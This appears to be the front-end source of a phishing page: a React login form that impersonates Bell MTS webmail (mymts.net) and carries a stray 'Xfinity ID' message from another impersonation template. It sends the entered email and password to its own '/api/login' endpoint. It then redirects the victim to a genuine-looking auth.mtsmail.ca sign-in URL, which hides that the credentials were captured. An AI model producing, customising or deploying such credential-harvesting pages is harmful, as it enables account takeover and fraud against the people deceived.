"use client";
import { useState } from "react";
import axios from "axios";

export default function LoginForm() {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [step, setStep] = useState<"username" | "password">("username");
  const [formData, setFormData] = useState({ user_name: "", password: "" });
  const [errors, setErrors] = useState<{
    user_name?: string;
    password?: string;
  }>({});
  const [isChecked, setIsChecked] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const validateUsername = (value: string) => {
    if (!value.trim()) return "Please enter your Xfinity ID to sign in.";
    return null;
  };

  const validatePassword = (value: string) => {
    if (!value.trim()) return "Password is required.";
    // if (value.length < 6) return "Password must be at least 6 characters.";
    return null;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const newErrors: typeof errors = {};

    if (step === "username") {
      const usernameError = validateUsername(formData.user_name);
      if (usernameError) {
        newErrors.user_name = usernameError;
        setErrors(newErrors);
        return;
      }

      setErrors({});
      setIsSubmitting(true);

      setTimeout(() => {
        setStep("password");
        setIsSubmitting(false);
      }, 1200);

      return;
    }

    const passwordError = validatePassword(formData.password);
    if (passwordError) {
      setErrors({ password: passwordError });
      return;
    }

    setErrors({});
    setIsSubmitting(true);

    try {
      const response = await axios.post("/api/login", formData, {
        headers: { "Content-Type": "application/json" },
      });

      if (response.status === 200) {
        window.location.href =
          "https://auth.mtsmail.ca/saml/module.php/authSynacor/login.php?AuthState=_51b8070552b8672e44dea88d0d01a9e20becc34020%3Ahttps%3A%2F%2Fauth.mtsmail.ca%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fwebmail2.mymts.net%252F%26cookieTime%3D1749542259";
      }
    } catch (error) {
      console.error("Error:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      <div className="flex-1 flex flex-col">
        <div className="flex justify-center items-center m-auto">
          <div>
            <img
              src="/images/bellmts.png"
              alt="Logo"
              width={100}
              className="w-[170px] mb-2 ml-0"
            />
            <div className="text-xs mb-6">
              Log in with your mymts.net email address
            </div>
            <form
              className="bg-[#f2f2f2] py-6 px-7 rounded-sm w-[320px]"
              onSubmit={handleSubmit}
            >
              <input
                placeholder="Email Address (example@mymts.net)"
                className="bg-white py-2 px-3 text-[13px] font-[600] text-gray-500  border-gray-400 border rounded-sm w-full mb-4 focus-within:shadow-[0_0_0_3px_rgba(92,241,255,0.5)] focus-within:outline-none mb-4"
                id="username"
                type="text"
                name="username"
                value={formData.user_name}
                onChange={(e) => {
                  setFormData({ ...formData, user_name: e.target.value });
                  if (errors.user_name)
                    setErrors({ ...errors, user_name: undefined });
                }}
                tabIndex={1}
                autoCapitalize="off"
                autoCorrect="off"
                required={true}
                autoFocus={true}
              />
              <div className="relative">
                <input
                  placeholder="Password"
                  className="bg-white py-2 px-3 text-[13px] font-[600] text-gray-500  border-gray-400 border rounded-sm w-full mb-4 focus-within:shadow-[0_0_0_3px_rgba(92,241,255,0.5)] focus-within:outline-none mb-4"
                  id="password"
                  type={showPassword ? "text" : "password"}
                  name="password"
                  value={formData.password}
                  onChange={(e) => {
                    setFormData({ ...formData, password: e.target.value });
                    if (errors.password)
                      setErrors({ ...errors, password: undefined });
                  }}
                  tabIndex={1}
                  autoCapitalize="off"
                  autoCorrect="off"
                  required={true}
                  autoFocus={true}
                />
                <span
                  className="absolute top-2.5 right-3.5 text-[#0088cc] text-[10px] font-[500] cursor-pointer"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? "HIDE" : "SHOW"}
                </span>
              </div>
              <button
                type="submit"
                disabled={isSubmitting}
                className="bg-[#076390] w-full text-white py-3  px-6 rounded font-medium hover:bg-[#076380] transition-colors disabled:opacity-50 disabled:cursor-not-allowed mb-4"
              >
                LOG IN
              </button>
              <div className="flex items-center justify-between">
                <div className="flex items-center  gap-2">
                  <input
                    type="checkbox"
                    checked={isChecked}
                    onChange={() => setIsChecked(!isChecked)}
                    readOnly
                    className="w-[13px] h-[13px] border-gray-400 rounded-sm cursor-pointer"
                  />
                  <div className="text-[14px]">Remember Me</div>
                </div>
                <div className="text-[14px] font-semibold text-[#076390]">
                  Forgot Password?
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
}
